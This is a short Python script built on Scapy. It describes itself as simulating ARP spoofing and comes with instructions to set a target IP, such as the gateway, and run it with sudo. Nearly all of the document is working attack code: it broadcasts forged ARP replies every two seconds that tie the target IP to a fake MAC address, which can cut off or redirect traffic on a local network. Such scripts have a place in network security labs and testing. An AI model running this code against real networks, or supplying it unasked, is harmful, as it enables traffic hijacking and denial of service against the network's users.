"""
this script aims to simulate an ARP spoofing attack 
it impersonates a target machine by associating an IP address to a fake MAC address

How to proceed :
- Define the IP address you want to target(gateway IP for instance)
- Launch the script with the following terminal command : sudo python3 arp.py
The script sends 1 packet every 2 seconds until a manual interruption(Ctrl+C)

"""

from scapy.all import sendp, ARP, Ether
import time
from utils.config import Config, Color

#TO UPDATE  : define the IP address you want to target 
target_ip = "TARGET_IP"    
spoofed_mac = "aa:bb:cc:dd:ee:ff" 
print(f"{Color.BLUE} Starting Arp Spoofing on {Config.INTERFACE}...{Color.RESET}")
print(f"{Color.BLUE}Pretending that IP {target_ip} has MAC {spoofed_mac}{Color.RESET}" )

#Creates an ARP reply packet with a spoofed MAC address then broadcast it to the entire network
packet = Ether(dst="ff:ff:ff:ff:ff:ff") /ARP(op=2, psrc=target_ip, hwsrc=spoofed_mac)

try:
    while True:
        sendp(packet , iface=Config.INTERFACE, verbose=False)
        print(f"{Color.ORANGE}forged packet sent !{Color.RESET}")
        time.sleep(2)      
except KeyboardInterrupt:
    print(f"{Color.RED}\n Stopping ARP Attack.{Color.RESET}")
